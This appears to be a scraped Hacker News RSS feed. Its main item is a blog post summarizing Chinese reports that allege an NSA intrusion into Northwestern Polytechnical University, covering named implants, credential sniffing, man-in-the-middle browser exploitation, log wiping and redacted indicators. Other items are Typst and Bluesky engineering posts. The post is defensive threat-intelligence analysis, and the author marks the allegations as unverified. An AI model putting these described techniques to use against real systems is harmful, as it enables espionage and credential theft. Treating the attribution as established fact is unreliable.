  <span>(</span><span>0pt</span><span>,</span> <span>50pt</span><span>)</span><span>,</span>
  <span>(</span><span>100pt</span><span>,</span> <span>50pt</span><span>)</span><span>,</span>
  <span>(</span><span>(</span><span>50pt</span><span>,</span> <span>0pt</span><span>)</span><span>,</span> <span>(</span><span>40pt</span><span>,</span> <span>0pt</span><span>)</span><span>)</span><span>,</span>
<span>)</span>
</code></pre><p><img src="https://typst.app/assets/docs/yyBp4WXUJsfs9M85K5v8WgAAAAAAAAAA.png" alt="Preview" width="480" height="160"></p></div> <h3 id="pattern-migration">Patterns</h3> <p>The <code>pattern</code> type was renamed to <a href="https://typst.app/docs/reference/visualize/tiling/" title="`tiling`"><code>tiling</code></a>. To migrate, simply replace <code>pattern</code> with <code>tiling</code>. No further changes are necessary. The name <code>pattern</code> remains as a deprecated alias in Typst 0.13, but will be removed in an upcoming release.</p> <p>Why the rename? For once, the name <code>pattern</code> was very generic. The name <code>tiling</code> is more closely associated with what it expresses. Secondly, we're considering to repurpose the name <code>pattern</code> for what today are <a href="https://typst.app/docs/reference/foundations/selector/">selectors</a> once elements and types are unified.</p> <pre><code><span>// Typst 0.13+ ✅</span>
<span>#</span><span>rect</span><span>(</span>fill<span>:</span> <span>tiling</span><span>(</span><span>..</span><span>)</span><span>)</span>

<span>// Typst 0.12 and below ⚠️</span>
<span>#</span><span>rect</span><span>(</span>fill<span>:</span> <span>pattern</span><span>(</span><span>..</span><span>)</span><span>)</span>
</code></pre> <h3 id="removals">Removals</h3> <p>We also removed a number of things that were already deprecated and warned for in Typst 0.12. This includes the</p> <ul> <li><code>style</code> function and <code>styles</code> argument of <a href="https://typst.app/docs/reference/layout/measure/" title="`measure`"><code>measure</code></a>; use a <a href="https://typst.app/docs/reference/context/" title="context">context</a> expression instead</li> <li><code>state.display</code> function; use <a href="https://typst.app/docs/reference/introspection/state/#definitions-get" title="`state.get`"><code>state.get</code></a> instead</li> <li><code>location</code> argument of <a href="https://typst.app/docs/reference/introspection/state/#definitions-at" title="`state.at`"><code>state.at</code></a>, <a href="https://typst.app/docs/reference/introspection/counter/#definitions-at" title="`counter.at`"><code>counter.at</code></a>, and <a href="https://typst.app/docs/reference/introspection/query/" title="`query`"><code>query</code></a></li> <li>compatibility behavior where <a href="https://typst.app/docs/reference/introspection/counter/#definitions-display" title="`counter.display`"><code>counter.display</code></a> worked without <a href="https://typst.app/docs/reference/context/" title="context">context</a></li> <li>compatibility behavior of <a href="https://typst.app/docs/reference/introspection/locate/" title="`locate`"><code>locate</code></a></li> </ul> <p>Refer to the <a href="https://typst.app/blog/2024/typst-0.12/#migrating-your-documents">Migration section of the Typst 0.12 announcement post</a> to learn more about how to migrate away from these functions.</p>  <p>That's it for Typst 0.13. We hope you're just as excited about the release as we are!</p> <p>We're hosting a <a href="https://discord.gg/UE5U86pePm?event=1341075095837348003">community call on Discord on Friday, March 7th</a>. Join us to share your experiences with the new version and to chat with the community!</p> </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[An inside look at NSA tactics, techniques and procedures from China's lens (159 pts)]]></title>
            <link>https://www.inversecos.com/2025/02/an-inside-look-at-nsa-equation-group.html</link>
            <guid>43105357</guid>
            <pubDate>Wed, 19 Feb 2025 18:16:06 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.inversecos.com/2025/02/an-inside-look-at-nsa-equation-group.html">https://www.inversecos.com/2025/02/an-inside-look-at-nsa-equation-group.html</a>, See on <a href="https://news.ycombinator.com/item?id=43105357">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="post-body-7319337623616656911">
<p><span><i><a href="https://blogger.googleusercontent.com/img/a/AVvXsEgoQiIBaVeUTZsRlmUKJjskiYSh5We-HL-5RffZM4CT5seQ079EQxIW2OLw8_A9gSa0HmWWX8k0_c1mALkKwj9XmE08Fw2e1-8mxL0cmQpoYoulw2mYB5NLNRUq5t5b4I8upo6gsNCd-kPQbtAOh5f9o_CAdPyDX_CojA5_L-gI8ygt_dnXgtwC51kBrk7u"><img alt="" data-original-height="566" data-original-width="1001" height="1" src="https://blogger.googleusercontent.com/img/a/AVvXsEgoQiIBaVeUTZsRlmUKJjskiYSh5We-HL-5RffZM4CT5seQ079EQxIW2OLw8_A9gSa0HmWWX8k0_c1mALkKwj9XmE08Fw2e1-8mxL0cmQpoYoulw2mYB5NLNRUq5t5b4I8upo6gsNCd-kPQbtAOh5f9o_CAdPyDX_CojA5_L-gI8ygt_dnXgtwC51kBrk7u" width="1"></a></i></span></p><p><span><i><a href="https://blogger.googleusercontent.com/img/a/AVvXsEiO29aipqRS1qDWa5hOAZ7vFHUmxnUUw9N5eEdFdLXxznBIXPl9D7JdnbYSUfsHpm0PdJ5TXCQRBsrIGIGiscVt-adU9XNLgdCz9l5oBCYvnHeCyIAvHucT8dfDWypl2s1VGAnAThi_E6vF3Jp3sN5GWUokWAfZeDKV0gOGmz2lauT-DRjEOvDckPwCucnY"><img alt="" data-original-height="566" data-original-width="1001" src="https://blogger.googleusercontent.com/img/a/AVvXsEiO29aipqRS1qDWa5hOAZ7vFHUmxnUUw9N5eEdFdLXxznBIXPl9D7JdnbYSUfsHpm0PdJ5TXCQRBsrIGIGiscVt-adU9XNLgdCz9l5oBCYvnHeCyIAvHucT8dfDWypl2s1VGAnAThi_E6vF3Jp3sN5GWUokWAfZeDKV0gOGmz2lauT-DRjEOvDckPwCucnY=s16000"></a></i></span></p><p><span>Since I reside in a Five Eyes country (Australia) and have publicly presented <a href="https://www.youtube.com/watch?v=7aemGhaE9ds" target="_blank">four cases I led on China’s APT41 attacking organisations in ASEAN</a>, particularly concerning China’s cyber and political strategies, I was curious to explore what China publishes about Five Eyes operations. This led me down a rabbit hole of research into TTPs that Chinese cybersecurity entities have attributed to the NSA – or, as they coin “APT-C-40”.</span></p><p><span>These insights stem from extensive research I did on Weixin containing intelligence reports published by China’s Qihoo 360, Pangu Lab, and the National Computer Virus Emergency Response Center (CVERC). It is important to note that the authenticity and extent of these allegations remain unverified by independent sources. My goal in writing this blog is simply to aggregate and share what Chinese sources are publishing about NSA’s cyber operations (APT-C-40) to see if I could learn any new detection techniques or offensive techniques to research for fun.&nbsp;</span></p><p><span>As I did this research, I had a realisation that the Chinese methodology of Incident Response appears very different to how we perform IR in the West and had me thinking more about how I could modify some of my own methodologies to include some of the learnings. Maybe I will write a blog on this in the future.&nbsp;</span><span>Ultimately, depending on the reception of this blog, I may continue this series by sharing my other findings on Chinese reports regarding CIA (APT-C-39) cyber operations and a third North American group (not NSA or CIA) that Chinese firms are tracking named APT-C-57.</span></p><h2><span><b><span>How the
NSA Allegedly Hacked China’s <strong>Northwestern
Polytechnical University</strong></span></b></span></h2><p><span>This is how China’s Northwestern Polytechnical University,
a leading institution specializing in aerospace and defence, allegedly became
the target of a sophisticated cyberattack attributed to the NSA’s APT-C-40 group<strong><span> back in 2022</span></strong>.
Reports claim that the attack was executed by Tailored Access Operations (TAO)<b>,</b> a
division within the NSA, which allegedly deployed over 40 unique malware strains
to conduct data theft and
espionage.<p>

All the information regarding this breach is publicly disclosed on the internet
by Chinese cyber companies Qihoo 360 and National Computer Virus Emergency
Response Centre on Weixin.</p></span></p><p><span><b><span>How did China
perform the attribution?</span></b>Through the joint investigation and forensics on
the University, CVERC and 360 identified 4 IPs that the NSA supposedly purchased
through two cover companies “Jackson Smith Consultants” and “Mueller
Diversified Systems”. The four IPs identified are listed at the end of this
report. CVERC and 360 alleged a TAO employee with the pseudonym “Amanda
Ramirez” anonymously purchased these for the NSA’s FoxAcid platform which was
later used in the attack on the University.<p>

CVERC and 360 also alleged that the NSA had used anonymous protection services
of a Registrar in the US to anonymize domain names and certificates to prevent
them from being queried by public channels. <b><o:p></o:p></b></p></span></p><p><span>Investigators from CVERC
and 360 were able to trace the attack back to NSA's TAO unit
through a mix of human error, patterns in their analysis and tool overlap.&nbsp;</span></p><p><b><span lang="EN-GB"><span>1. Attack Times</span></span></b></p><ul><li><span><span>One of the frameworks used by TAO that was
forensically uncovered during the incident named “NOPEN” requires human
operation. As such, a lot of the attack required hands-on-keyboard and data analysis
of the incident timeline showed 98% of all the attacks occurred during 9am –
16pm EST (US working hours).<br></span></span></li><li><span><span>There were zero cyber-attacks on Saturdays and Sundays
with all attacks centralised between Mon-Fri.<br></span></span></li><li><span><span>No attacks occurred during Memorial Day and
Independence Day holidays which were unique American holidays.<br></span></span></li><li><span><span>No attacks occurred during Christmas.<br></span></span></li></ul><p><b><span lang="EN-GB"><span>2. Keyboard Inputs</span></span></b></p><ul><li><span><span>Attacker used American English.</span></span></li><li><span><span>All devices used by the attacker had English OS and
English applications.<br></span></span></li><li><span><span>American keyboard was utilised.<br></span></span></li></ul><p><b><span lang="EN-GB"><span>3. Human Errors</span></span></b></p><ul><li><span><span>Due to the length and scale of the incident, when one
of the alleged NSA “attackers” tried to upload and run a Pyscript tool, they
forgot to modify the parameters. This returned an error – the error message
exposed the working directory and file name of the attacker’s internet
terminal.<br></span></span></li><li><span><span>This was then used to identify that they were running on a Linux
system and the directory “etc/autoutils” was known to be the special name of
the TAO network attack tool directory.</span></span></li><li><i><span>The error message is as follows: Quantifier follows nothing in regex; marked
by &lt;-- HERE in m/* &lt;-- HERE .log/ at .. /etc/autoutils line 4569</span></i></li></ul><p><b><span lang="EN-GB"><span>4. Tools Were Found Prior to Shadow Brokers Leak</span></span></b></p><ul><li><span><span lang="EN-GB">The </span><span>Northwestern Polytechnical University had
allegedly suffered multiple breaches throughout the years where several pieces
of malware uncovered in prior investigations (prior to Shadow Broker’s leak)
were allegedly the same tools described in the Shadow Broker’s leak</span><span>. They did not provide further information</span><span> on this.<br></span></span></li></ul><p><b><span lang="EN-GB"><span>5. Toolkits related to NSA</span></span></b></p><ul><li><span><span>41 different tools and malware samples were identified
as a part of the investigation in the forensic analysis.<br></span></span></li><li><span>16 of these tools were consistent with the TAO weapons
exposed by the Shadow Brokers leak.<br></span></li><li><span>23 of the tools had around 97% similarity to the tools
in the Shadow Brokers leak.<br></span></li><li><span>2 of these tools were not found in Shadow Brokers but
were seen used by TAO in other cyber-attacks (according to 360).</span></li></ul><p><b><span><span>Inside the Attack:
Alleged NSA TTPs </span><o:p></o:p></span></b></p><p><b><span><br>1. Pre Attack Preparation<o:p></o:p></span></b></p><p><span>One of the NSA's
primary strategies in breaching the university was the use of zero-days.
However, to begin the attack the attackers first conducted a pre-attack
preparation phase with extensive work. Two zero-days were used to breach any
company with SunOS-exposed systems in neighbouring countries to China. 360 and
CVERC did not specify which vulnerabilities were targeted in their reports. <o:p></o:p></span></p><p><span>Specifically, the
NSA would target any server with large network traffic (i.e. educational
institutions and commercial organisations). Once the attack was successful,
they would install NOPEN (more on this later) to establish a foothold. By
deploying zero-days on these systems, they established access on these systems
that would later be used as springboards for the main attack on the University.<o:p></o:p></span></p><p><span lang="EN-GB"><span>In total, 54 jump servers and 5 proxy
servers were used to perform the attack coming from 17 different countries
including Japan, South Korea, Sweden, Poland and Ukraine with 70% of the
attacks coming from China’s neighbouring countries. <o:p></o:p></span></span></p><p><span>The proprietary tool that was alleged to be run:<o:p></o:p></span></p><ul><li><span>SHAVER: This tool was used to attack the SunOS exposed servers that were used for the jump servers. This was identified as an automated exploitation tool designed for x86 and SPARC architectures with RPC services enabled.</span></li></ul><p><b><span><span>2. Initial Access into the University<o:p></o:p></span></span></b></p><p><span><span>To gain access into the network, they leveraged
MiTM and spear phishing emails. Around April, there were phishing emails
identified with references to “scientific research review” targeted towards
members of the University (students and teachers). These phishing emails
contained malware embedded in them and some were designed to steal credentials
from these users.<o:p></o:p></span></span></p><p><span><span>Aside from this, 360 and CVERC also reported that
one of the platforms used was a platform coined as <a href="https://nsarchive.gwu.edu/document/22069-document-01" target="_blank">“FOXACID” which was a partof the Snowden leaks</a>.
This platform according to Wikileaks, 360 and CVERC is a 0-day vulnerability
attack platform designed by the NSA to automate delivery of browser (IE, Chrome,
FireFox, Safari, Android Webkit etc) exploits to workstations, servers and
mobile devices. </span><span>When
a user tries to access a website like Gmail, BiliBili (Chinese YouTube) instead
of the normal server response, the response is hijacked to redirect to APT-C-40
(NSA) controlled server which injects malware onto the user’s browser. Below is
a diagram 360 drew of how it works (I translated it into English with Google).</span></span></p><table><tbody><tr><td><a href="https://blogger.googleusercontent.com/img/a/AVvXsEj1P0TE4Oh0Z4EQxcaQEnNlYSka8ToIPtvBoVoyBXm-POJpCFVgD6FyoAMAUz84CMKrSgm2X_LjWphSyUoJ4XSYznhIklIXF-YG4g31uydFzwqoOOiOyrD2G9wi0M6vEiSczvstxIpftVEZa_qdoHqt1R7UVf29mT-chOUS5MVG_BmXfm4NTIzhXaqMrXfw"><img alt="" data-original-height="1024" data-original-width="1379" src="https://blogger.googleusercontent.com/img/a/AVvXsEj1P0TE4Oh0Z4EQxcaQEnNlYSka8ToIPtvBoVoyBXm-POJpCFVgD6FyoAMAUz84CMKrSgm2X_LjWphSyUoJ4XSYznhIklIXF-YG4g31uydFzwqoOOiOyrD2G9wi0M6vEiSczvstxIpftVEZa_qdoHqt1R7UVf29mT-chOUS5MVG_BmXfm4NTIzhXaqMrXfw=s16000"></a></td></tr><tr><td>Qihoo 360 - Diagram</td></tr></tbody></table><p><span><span>The question would be “how did they use FOXACID”
without having compromised systems? Based on the reports it seems like this is
a logical sequence of events:<o:p></o:p></span></span></p><ol><li><span><span>External servers of the University were compromised
giving APT-C-40 foothold into the environment using a tool called ISLAND
(manual exploitation of Solaris systems)</span></span></li><li><span><span>APT-C-40 installed a framework called SECONDDATE an
</span><span lang="EN-GB">espionage software designed to be installed on network
devices (gateways, border routers and firewalls). There is a server and control
side to the tool. The server is run on the network edge device and the traffic
is monitored/tampered through a driver. The communication back to controller is
encrypted and the port used is randomised. Second date has capabilities of
network eavesdropping, MiTM, and code injection. It can be used with other
malware to perform espionage activities. It’s primarily used to hijack mass
amounts of data traffic, tampering and misdirection.</span></span></li><li><span><span>SECONDDATE redirects traffic from users within the
University network accessing popular sites like BiliBili to FOXACID platform
which performs the browser exploitation on the student/staff devices to gain
control.&nbsp;</span></span></li></ol><p><span><span>Using this MiTM platform, they allegedly hijacked
internal hosts and servers of the University before deploying further tools for
remote control of the systems. This allowed them access into core network
equipment, servers and terminals relating to ops and maintenance of the
University network. Of interest (and this appears to be a pattern), APT-C-40
(according to 360 and CVERC) had a keen interest on network devices like
routers and switches. <o:p></o:p></span></span></p><p><span><span>The proprietary tools that were alleged to be run
include:<o:p></o:p></span></span></p><ul><li><span><span>ISLAND: This tool was
allegedly run against the University’s external servers to gain control. It is
a manual exploitation tool used to breach Solaris-based systems.</span></span></li><li><span><span>FOXACID: <a href="https://www.schneier.com/blog/archives/2013/10/how_the_nsa_att.html" target="_blank">Browserexploitation framework</a> that fingerprints the browser and deploys a 0-day.&nbsp;</span></span></li><li><span><span>SECONDDATE: This
tool was allegedly used by TAO (NSA) to hack into the office intranet of the
University. </span><span lang="EN-GB">Attribution of SECONDDATE was discovered through
collaboration with other industry partners. They found thousands of network
devices running this spyware – where the communications went back to NSA
servers located in Germany, Japan, South Korea and Taiwan. This tool was used
to redirect user traffic to the FOXACID platform.</span></span></li></ul><p><b><span><span>3. Persistence and Lateral Movement<o:p></o:p></span></span></b></p><div>

<p><span><span>After securing
initial access, APT-C-40 focused on long-term persistence and lateral movement
across the university’s network. To avoid detection, they allegedly deployed a
combination of backdoors and credential theft techniques.<o:p></o:p></span></span></p><ul><li><span lang="EN-GB"><span>SECONDDATE – Backdoor installed on network
edge devices such as gateways and border routers to filter, and hijack mass
amounts of data in a MiTM. This was placed on the border routers of the
University to hijack traffic to redirect to NSA’s FOXACID platform.</span></span></li><li><span><span>NOPEN: A remote-controlled
malware that provided NSA operators with ongoing access to compromised systems.
It allowed for file execution, process management, system command execution,
and privilege escalation. TAO used this to gain persistent control over core
business servers and key network equipment.</span></span></li><li><span lang="EN-GB"><span>FLAME SPRAY - Windows-based
remote-controlled malware with strong anti-analysis features. Can be customized
to generate different types of servers. Works with the "Acid Fox"
platform to control personal office network hosts. It has strong
anti-analysis/anti debug capabilities. </span></span></li><li><span><span>CUNNING HERETICS: A
lightweight implant that established encrypted communication channels for NSA
to remotely reactivate access points even after clean up attempts.</span></span></li><li><span><span>STOIC SURGEON: A
stealthy backdoor targeting Linux, Solaris, JunOS, and FreeBSD systems,
enabling the NSA to maintain control while avoiding security audits.</span></span></li></ul><p><b><span><span>4. Lateral Movement Techniques:<o:p></o:p></span></span></b></p><p><span><span>There was a keen focus from APT-C-40 on targeting
edge network devices. From the IR perspective this makes complete sense (lack
of EDR, lack of logs, lack of visibility and differing OS’s makes investigation
at scale incredible difficult and very manual). At this stage of the attack,
they used legitimate credentials to access firewall appliances and focused a
portion of the attacks on the telecom operators of the University. This was
highlighted by 360 and CVERC as their method of fingerprinting and accessing
personal data related to key researchers.<o:p></o:p></span></span></p></div><ul><li><span><span lang="EN-GB">Legitimate Credentials: NSA allegedly used
legitimate credentials for the Cisco PIX firewall, Tianrongxin firewall and
other equipment to scope out the intranet, monitor data, control the SMS
gateway and telecom operators. They then relied on other tools like MAGIC
SCHOOL to query sensitive personnel, encrypted the information and exfiltrated
it. The result of the queried data was saved to: </span><span lang="EN-GB">var/tmp/.2e434fd8aeae73e1/erf/out/f/</span><span lang="EN-GB"> before being encrypted and exfiltrated.<o:p></o:p></span></span></li><li><span><span>Hijacking Intranet
Upgrade Programs: The NSA allegedly compromised software update mechanisms to
distribute malware disguised as legitimate updates.</span></span></li><li><span><span>Credential
Harvesting via the tool DRINKING TEA: This tool sniffed SSH, Telnet, and Rlogin
passwords used by university IT administrators, granting NSA full access to
internal systems. </span><span lang="EN-GB">NSA allegedly used this to capture
command-line logs, passwords generated by University staff during their
operation and maintenance work. This data was them compressed and encrypted for
exfil by NOPEN. These credentials then gave them more access to edge devices
and business devices.</span></span></li><li><span><span>Hijacking Border
Routers: NSA installed Second Date spyware on university routers, allowing them
to intercept, manipulate, and reroute network traffic.</span></span></li></ul><p><b><span><span>5. Data Exfiltration: Stealing Critical Research
and Credentials<o:p></o:p></span></span></b></p><p><span><span>Once inside, NSA
operatives allegedly systematically stole classified research data, network
infrastructure details, and sensitive operational documents.<o:p></o:p></span></span></p><p><span><span>Exfiltration Methods Used:<b><o:p></o:p></b></span></span></p><ul><li><span><span>OPERATION BEHIND
ENEMY LINES: A suite of tools used to query, package, and encrypt stolen data
before transmitting it to NSA-controlled servers.</span></span></li><li><span><span>School of Magic,
Clown Food, and Cursed Fire: These NSA tools were specifically designed for
extracting sensitive files from telecom and defense research systems.</span></span></li><li><span><span>Use of Proxy
Servers &amp; VPNs: To avoid detection, stolen data was routed through 54 jump
servers and proxy nodes in 17 countries, masking the true origin of the
attackers.</span></span></li></ul><p><b><span><span>6. Evasion and Anti-Forensic Measures<o:p></o:p></span></span></b></p><div>

<p><span><span>To minimize the
risk of detection and forensic investigation, the NSA employed several
anti-forensic techniques (but most of these are inbuilt in the tools and
frameworks they leveraged):<o:p></o:p></span></span></p><ul><li><span><span>TOAST BREAD: A log
manipulation tool that erased evidence of unauthorized access, including UTMP,
WTMP, and LASTLOG files.</span></span></li><li><span><span>Encrypted
Communications: All NSA tools leveraged encryption, ensuring that traffic to
their command-and-control (C2) servers remained undetectable.</span></span></li></ul></div><p><span><b><span>What did I learn from this?</span></b><span><o:p></o:p></span></span></p><p><span>There is a clear and structured
collaboration amongst Chinese cybersecurity organizations during casework.
While industry collaboration exists in the West through closed invite-only
groups, Chinese cyber organizations openly acknowledge and publicize their
partnerships. This openness was particularly interesting to observe and may be
influenced by cultural factors, such as the Confucian emphasis on shared
knowledge and a political framework that encourages collective efforts.
Additionally, this collaboration extends across borders, involving
cybersecurity entities from multiple countries.<o:p></o:p></span></p><p><span>In the Incident Response process,
Western methodologies typically focus on constructing a super timeline of an
attack, detailing events in chronological order. We compile timelines, document
indicators of compromise (IoCs), and hand off reports to intelligence teams,
often accompanied by a verbal debrief. However, large-scale data analysis using
AI across multiple cases—or even on a single case—is not a standard practice. A
key observation from the Chinese case notes was the extensive use of big data
analysis, particularly in tracking “hands-on keyboard” activity. This approach enabled
Qihoo 360 to identify patterns, such as the alleged absence of activity on
Memorial Day, and precisely documenting the operational hours of the attackers,
allowing 360 to isolate activity to Monday-Friday, EST working hours.<o:p></o:p></span></p><p><span>Attacks on edge devices, IoT,
and network appliances appear to be becoming the norm. From a threat actor’s
perspective, this makes complete sense. Most adversaries are aware that XDR/EDR
solutions are deployed on traditional endpoints, making edge devices an
attractive target for initial access and persistence. Defending and detecting
such threats is particularly challenging due to the variety of operating
systems, proprietary encoding methods, and the extensive manual forensic
analysis required. The focus on edge devices is not unique to the NSA—it is an
emerging trend that is likely to escalate. We have already seen Chinese APTs
and Russian actors adopting similar techniques, including firmware
manipulation. It will be interesting to see how this space evolves.<o:p></o:p></span></p><p><span>Finally, across the reports,
there were sporadic mentions that most of the attack frameworks operated
in-memory, with no files written to disk. This is not abnormal to see –
however, it is interesting always to observe how the investigation and
forensics was done. One area I wish had been covered in more detail was the
methodology used to investigate these attacks, particularly how IR teams
conducted forensic analysis on edge devices and routers.</span></p><p><b><span><span>Alleged NSA IoCs</span><span><o:p></o:p></span></span></b></p><p><span><span><i>The IPs are redacted by 360 and CVERC (not me).<br></i><br><b>NSA IPs (Purchased through cover companies):<o:p></o:p></b></span></span></p><p><span><span>209.59.36.xx<br>
69.165.54.xx<br>
207.195.240.xx<br>
209.118.143.xx<o:p></o:p></span></span></p><p><b><span><span>Weapon Platform IPs (C2 Servers):<o:p></o:p></span></span></b></p><p><span><span>192.242.xx.xx
(Colombia)<br></span><span>81.31.xx.xx (Czech
Republic)<br></span><span>80.77.xx.xx (Egypt)<br></span><span>83.98.xx.xx
(Netherlands)<br></span><span>82.103.xx.xx
(Denmark)</span></span></p><p><b><span><span>IPs Used to Launch Attacks:<o:p></o:p></span></span></b></p><p><span><span>211.119.xx.xx
(Korea)<br></span><span>210.143.xx.xx
(Japan)<br></span><span>211.119.xx.xx
(Korea)<br></span><span>210.143.xx.xx
(Japan)<br></span><span>211.233.xx.xx
(Korea)<br></span><span>143.248.xx.xx
(Korea - Daejeon Institute of Science and Technology)<br>210.143.xx.xx (Japan)<br></span><span>211.233.xx.xx
(Korea)<br></span><span>210.143.xx.xx
(Japan)<br></span><span>210.143.xx.xx
(Japan)<br></span><span>210.143.xx.xx
(Korea - Korea National Open University)<br></span><span>211.233.xx.xx
(Korea - KT Telecom)<br></span><span>89.96.xx.xx
(Italy - Milan)<br></span><span>210.143.xx.xx
(Japan - Tokyo)<br></span><span>147.32.xx.xx
(Czech Republic - Brno)<br></span><span>132.248.xx.xx
(Mexico - UNAM)<br></span><span>195.162.xx.xx
(Sweden)<br></span><span>210.143.xx.xx
(Japan - Tokyo)<br></span><span>210.228.xx.xx
(Japan)<br></span><span>211.233.xx.xx
(Korea)<br></span><span>212.187.xx.xx
(Germany - Nuremberg)<br></span><span>222.187.xx.xx
(Germany - Bremen)<br></span><span>210.143.xx.xx
(Japan)<br></span><span>91.217.xx.xx
(Finland)<br></span><span>211.233.xx.xx
(Korea)<br></span><span>84.88.xx.xx
(Spain - Barcelona)<br></span><span>210.143.xx.xx
(Japan - Kyoto University)<br></span><span>132.248.xx.xx
(Mexico)<br></span><span>148.208.xx.xx
(Mexico)<br></span><span>192.162.xx.xx
(Italy)<br></span><span>211.233.xx.xx
(Korea)<br></span><span>218.232.xx.xx
(Korea)<br></span><span>148.208.xx.xx
(Mexico)<br></span><span>61.115.xx.xx
(Japan)<br></span><span>130.241.xx.xx
(Sweden)<br></span><span>210.143.xx.xx
(India)<br></span><span>210.143.xx.xx
(Japan)<br></span><span>202.30.xx.xx
(Australia)<br></span><span>220.66.xx.xx
(Korea)<br></span><span>222.122.xx.xx
(Korea)<br></span><span>141.57.xx.xx
(Germany - Leipzig Institute of Economics and Culture)<br></span><span>212.109.xx.xx
(Poland)<br></span><span>210.135.xx.xx
(Japan - Tokyo)<br></span><span>148.208.xx.xx
(Mexico)<br></span><span>82.148.xx.xx
(Qatar)<br></span><span>46.29.xx.xx
(UAE)<br></span><span>143.248.xx.xx
(Korea - Daejeon Institute of Science and Technology)</span></span></p><p><span><b>SecondDate CnC<br></b></span></p><p><span><span>MD5:
485a83b9175b50df214519d875b2ec93</span><span><span><span>&nbsp;<br></span></span></span><span>SHA-1:
0a7830ff10a02c80dee8ddf1ceb13076d12b7d83<br></span><span>SHA-256:
d799ab9b616be179f24dbe8af6ff76ff9e56874f298dab9096854ea228fc0aeb&nbsp;</span></span></p><p><b><span><span>SOURCES</span><span><o:p></o:p></span></span></b></p><p><span><a href="https://www.cverc.org.cn/head/zhaiyao/news20220905-NPU.htm">https://www.cverc.org.cn/head/zhaiyao/news20220905-NPU.htm</a><p>

<a href="https://mp.weixin.qq.com/s/CfkLGhqLB3hyVcDzqUQwJQ">https://mp.weixin.qq.com/s/CfkLGhqLB3hyVcDzqUQwJQ</a></p><o:p></o:p></span></p><p><span><a href="https://www.secrss.com/articles/54025">https://www.secrss.com/articles/54025</a><o:p></o:p></span></p><p><span><a href="https://www.cverc.org.cn/head/zhaiyao/news20220629-FoxAcid.htm" target="_blank" title="https://www.cverc.org.cn/head/zhaiyao/news20220629-FoxAcid.htm"><span>https://www.cverc.org.cn/head/zhaiyao/news20220629-FoxAcid.htm</span></a><o:p></o:p></span></p><p><span><a href="https://www.aclu.org/documents/foxacid-sop-operational-management-foxacid-infrastructure">https://www.aclu.org/documents/foxacid-sop-operational-management-foxacid-infrastructure</a><o:p></o:p></span></p><p><span><a href="https://nsarchive.gwu.edu/document/22069-document-01"><span>https://nsarchive.gwu.edu/document/22069-document-01</span></a><span><o:p></o:p></span></span></p><p><span><a href="https://www.schneier.com/blog/archives/2013/10/how_the_nsa_att.html"><span>https://www.schneier.com/blog/archives/2013/10/how_the_nsa_att.html</span></a><span><o:p></o:p></span></span></p><p><span><a href="https://m.thepaper.cn/wifiKey_detail.jsp?contid=20362635&amp;from=wifiKey" target="_blank" title="https://m.thepaper.cn/wifiKey_detail.jsp?contid=20362635&amp;from=wifiKey"><span>https://m.thepaper.cn/wifiKey_detail.jsp?contid=20362635&amp;from=wifiKey</span></a><o:p></o:p></span></p><p><span><span><a href="http://www.ce.cn/xwzx/gnsz/gdxw/202209/27/t20220927_38130496.shtml"><span>http://www.ce.cn/xwzx/gnsz/gdxw/202209/27/t20220927_38130496.shtml</span></a></span><o:p></o:p></span></p><p><span>https://world.huanqiu.com/article/4EX89Zq6zNg</span></p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Bill prohibiting police from lying to children passes Virginia Senate (193 pts)]]></title>
            <link>https://www.courthousenews.com/bill-prohibiting-police-from-lying-to-children-passes-virginia-senate/</link>
            <guid>43105035</guid>
            <pubDate>Wed, 19 Feb 2025 17:49:11 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.courthousenews.com/bill-prohibiting-police-from-lying-to-children-passes-virginia-senate/">https://www.courthousenews.com/bill-prohibiting-police-from-lying-to-children-passes-virginia-senate/</a>, See on <a href="https://news.ycombinator.com/item?id=43105035">Hacker News</a></p>
Couldn't get https://www.courthousenews.com/bill-prohibiting-police-from-lying-to-children-passes-virginia-senate/: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[When imperfect systems are good: Bluesky's lossy timelines (395 pts)]]></title>
            <link>https://jazco.dev/2025/02/19/imperfection/</link>
            <guid>43105028</guid>
            <pubDate>Wed, 19 Feb 2025 17:48:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://jazco.dev/2025/02/19/imperfection/">https://jazco.dev/2025/02/19/imperfection/</a>, See on <a href="https://news.ycombinator.com/item?id=43105028">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <article>
  
  <time datetime="2025-02-19T00:00:00+00:00">19 Feb 2025</time>
  <p>Often when designing systems, we aim for perfection in things like consistency of data, availability, latency, and more.</p>

<p>The hardest part of system design is that it’s difficult (if not impossible) to design systems that have perfect consistency, perfect availability, incredibly low latency, and incredibly high throughput, all at the same time.</p>

<p>Instead, when we approach system design, it’s best to treat each of these properties as points on different axes that we balance to find the “right fit” for the application we’re supporting.</p>

<p>I recently made some major tradeoffs in the design of <a href="https://bsky.app/">Bluesky’s</a> Following Feed/Timeline to improve the performance of writes at the cost of consistency in a way that doesn’t negatively affect users but reduced P99s by over 96%.</p>

<h2 id="timeline-fanout">Timeline Fanout</h2>

<p>When you make a post on Bluesky, your post is indexed by our systems and persisted to a database where we can fetch it to hydrate and serve in API responses.</p>

<p>Additionally, a reference to your post is “fanned out” to your followers so they can see it in their Timelines.</p>

<p><img src="https://jazco.dev/public/images/2025-02-19/fanout_diagram.png" alt="Fanout Diagram"></p>

<p>This process involves looking up all of your followers, then inserting a new row into each of their Timeline tables in reverse chronological order with a reference to your post.</p>

<p>When a user loads their Timeline, we fetch a page of post references and then hydrate the posts/actors concurrently to quickly build an API response and let them see the latest content from people they follow.</p>

<p>The Timelines table is sharded by user. This means each user gets their own Timeline partition, randomly distributed among shards of our horizontally scalable database (ScyllaDB), replicated across multiple shards for high availability.</p>

<p>Timelines are regularly trimmed when written to, keeping them near a target length and dropping older post references to conserve space.</p>

<h2 id="hot-shards-in-your-area">Hot Shards in Your Area</h2>

<p>Bluesky currently has around <a href="https://bsky.jazco.dev/stats">32 Million Users</a> and our Timelines database is broken into hundreds of shards.</p>

<p>To support millions of partitions on such a small number of shards, each user’s Timeline partition is colocated with tens of thousands of other users’ Timelines.</p>

<p><img src="https://jazco.dev/public/images/2025-02-19/shard_diagram.png" alt="Hot Shard Diagram"></p>

